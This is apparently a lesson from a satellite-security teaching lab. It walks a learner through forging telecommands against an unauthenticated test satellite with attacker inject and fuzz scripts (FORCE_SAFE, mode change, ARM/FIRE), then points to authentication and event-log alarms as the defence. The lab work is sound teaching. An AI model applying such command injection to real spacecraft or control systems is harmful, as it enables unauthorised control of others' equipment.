# L06 — Command injection

## Goal
Build a TC **from scratch** — without ever seeing the operator send a
legitimate one — and have the satellite act on it. This generalizes
replay: now the attacker is fully in control of APID, payload, and
sequencing.

## You'll need
- Satellite (SECURITY_LEVEL = 0).
- Attacker Pico front-end.

## Steps

### 1. Inject `FORCE_SAFE`
```bash
python -m groundstation.attacker.inject \
    --port /dev/ttyACM1 --apid 0x0FF
```
The satellite drops to SAFE mode. The next BEACON shows `M1`.

### 2. Inject `SET_MODE NOMINAL`
```bash
python -m groundstation.attacker.inject \
    --port /dev/ttyACM1 --apid 0x083 --data 00
```
Back to NOMINAL.

### 3. ARM + FIRE
```bash
python -m groundstation.attacker.inject --port /dev/ttyACM1 --apid 0x084
python -m groundstation.attacker.inject --port /dev/ttyACM1 --apid 0x085
```
`PAYLOAD_DATA` appears in the downlink. From a security perspective,
this is "took a picture from someone else's satellite."

### 4. Run the fuzzer briefly
```bash
python -m groundstation.attacker.fuzz \
    --port /dev/ttyACM1 --duration 30 --rate 5
```
Watch the satellite for crashes / hangs. Vanilla Semaeopus shouldn't
crash — the dispatcher is defensive — but it is a useful exercise for
the learner to think about what *would* crash an OBC and how flight
software typically handles malformed TCs (CCSDS PUS-1 "Acceptance"
reports).

## Discussion
The barrier to L05+L06 is **zero key material**. The defence is *not*
"don't broadcast TC structure" — it's "authenticate every TC". Lesson
L07 begins introducing that.

## Detective work
After the fuzzer runs, dump the satellite's event log (the EVENT TM
frames). How many `01 unknown apid` errors did the OBC emit? Could an
operator alarm on that rate?
